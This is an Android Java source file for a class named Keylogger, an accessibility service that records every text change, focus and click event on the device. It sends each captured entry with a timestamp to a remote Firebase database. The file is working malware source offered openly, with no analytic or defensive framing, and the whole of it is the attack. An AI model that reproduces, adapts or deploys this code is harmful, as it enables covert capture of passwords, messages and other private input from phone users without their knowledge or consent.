package xyz.logchar.keylog;

import android.accessibilityservice.AccessibilityService;
import android.annotation.SuppressLint;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.Calendar;
import java.text.SimpleDateFormat;
import java.text.DateFormat;
import java.util.HashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Keylogger extends AccessibilityService {

    private static final String TAG = "Keylogger";  // Define a tag for the logs
    FirebaseDatabase database = FirebaseDatabase.getInstance();
    DatabaseReference databaseReference = database.getReference("log");

    // Using ExecutorService for background task execution
    private final ExecutorService executorService = Executors.newSingleThreadExecutor();
    private final Handler mainHandler = new Handler(Looper.getMainLooper());

    private void sendToServer(final String logText) {
        executorService.execute(() -> {
            try {
                @SuppressLint("SimpleDateFormat")
                DateFormat days = new SimpleDateFormat("yyyy-MM-dd, HH:mm:ss");
                @SuppressLint("SimpleDateFormat")
                DateFormat times = new SimpleDateFormat("HH:mm:ss");
                String day = days.format(Calendar.getInstance().getTime());
                String time = times.format(Calendar.getInstance().getTime());

                HashMap<String, Object> hashMap = new HashMap<>();
                hashMap.put("time", time);
                hashMap.put("log", logText);

                // Running Firebase update on the main thread
                mainHandler.post(() -> databaseReference.child(day).updateChildren(hashMap));

            } catch (Exception e) {
                Log.e(TAG, "Error while sending log to server", e);  // Use Log.e to log errors
            }
        });
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        switch(event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                String text = event.getText().toString();
                sendToServer("|[TEXT]| " + text);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                String focused = event.getText().toString();
                sendToServer("|[FOCUSED]| " + focused);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                String click = event.getText().toString();
                sendToServer("|[CLICKED]| " + click);
                break;
            }
            default:
                break;
        }
    }

    @Override
    public void onInterrupt() {
        // Release resources if necessary
        executorService.shutdown();
    }
}
